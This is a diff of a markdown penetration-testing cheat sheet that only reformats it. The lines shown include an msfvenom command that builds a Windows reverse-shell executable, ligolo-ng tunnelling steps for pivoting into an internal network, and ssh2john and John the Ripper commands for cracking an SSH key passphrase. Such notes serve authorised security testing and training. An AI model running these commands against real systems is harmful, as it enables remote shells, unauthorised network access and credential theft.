@@ -27,22 +27,23 @@ Note: issues with starting chisel client when using the pre-compiled version fro
 ## msfvenom
 `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.186 LPORT=1337 -f exe > rev.exe ` Create windows reverse shell executable
 
-##ligolo-ng
+## ligolo-ng
 releases for proxy and agent on Github: https://github.com/nicocha30/ligolo-ng
-Start proxy:
-`sudo ip tuntap add user kali mode tun ligolo`
+
+__Start proxy:__\
+`sudo ip tuntap add user kali mode tun ligolo`\
 `sudo ip link set ligolo up`
 
 `./proxy -selfcert`
 
-Start ligolo agent:
+__Start ligolo agent:__\
 `.\ligolo-agent.exe -connect xxx.xxx.xxx.xxx:11601 -ignore-cert`
 
-Setup tunnel over proxy:
-`session` Select session
-`ifconfig` -- Show ip info
-`sudo ip route add 192.168.0.0/24 dev ligolo` Create route
-`start` Start tunnel
+__Setup tunnel over proxy:__\
+`session` Select session\
+`ifconfig` -- Show ip info\
+`sudo ip route add 192.168.0.0/24 dev ligolo` Create route\
+`start` Start tunnel\
 
 --Network is now reachable through proxy--
 
@@ -72,5 +73,5 @@ https://crackstation.net/
 ```
 
 ## Cracking SSH keyphrase
-ssh2john sample.key > sample.hash
-john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+`ssh2john sample.key > sample.hash`
+`john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`
